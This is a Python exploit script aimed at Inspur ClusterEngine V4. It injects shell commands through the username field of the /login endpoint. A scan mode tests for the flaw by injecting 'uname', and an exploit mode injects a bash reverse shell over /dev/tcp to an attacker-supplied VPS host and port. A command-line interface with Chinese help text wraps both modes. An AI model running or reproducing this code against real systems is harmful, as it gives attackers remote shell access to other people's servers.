import requests
import click
import urllib3


requests.packages.urllib3.disable_warnings()
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36",
        "Content-Type": "application/x-www-form-urlencoded"
    }


def info():
    print('+------------------------------------------')
    print('+  \033[34mgithub: https://github.com/yaunsky                                   \033[0m')
    print('+  \033[34mVersion: 浪潮ClusterEngine V4 命令执行                                             \033[0m')
    print('+  \033[36m使用格式:  python3 exp.py  --help                                          \033[0m')
    print('+------------------------------------------')
    

def exp(url,lhost,port):
    target = url+"/login"
    host=lhost
    data={
        "op" : "login",
        "username" : r'''1 2\',\'1\'\); `bash -i >& /dev/tcp/''' +host+ r'''/''' + port+ ''' 0>&1`'''
        }
    rep = requests.post(url=target, headers=headers, data=data, timeout=5, verify=False)

def scan(url):
    target = url+"/login"
    data={
        "op" : "login",
        "username" : "1 2\\',\\'1\\'\\); $(uname)"
        }
    try:
        rep = requests.post(url=target, headers=headers, data=data, timeout=5, verify=False)
        if "Linux" in rep.text:
            print("\033[32m【++++】 漏洞存在！\033[0m")
        else:
            print("\033[31m【----】 漏洞不存在 \033[0m")
    except:
        print("【---】请求出错。。。。。。")


#def exp():

@click.command()
@click.option("-u", "--url", help='被攻击地址; Example:http://ip:port。如果是探测是否存在漏洞，请只提供url即可')
@click.option("-l", "--lhost", help="VPS 地址")
@click.option("-p", "--port", help="VPS 端口")
def main(url, lhost, port):
    info()
    if url == None:
        print("请查看使用帮助，提供参数！")
    elif url != None and lhost == None:
        try:
            scan(url)
        except:
            print("【---】请求出错。。。。。。")
    else:
        try:
            exp(str(url),str(lhost),str(port))
        except:
            print("【---】请求出错。。。。。。")


if __name__ == '__main__':
    main()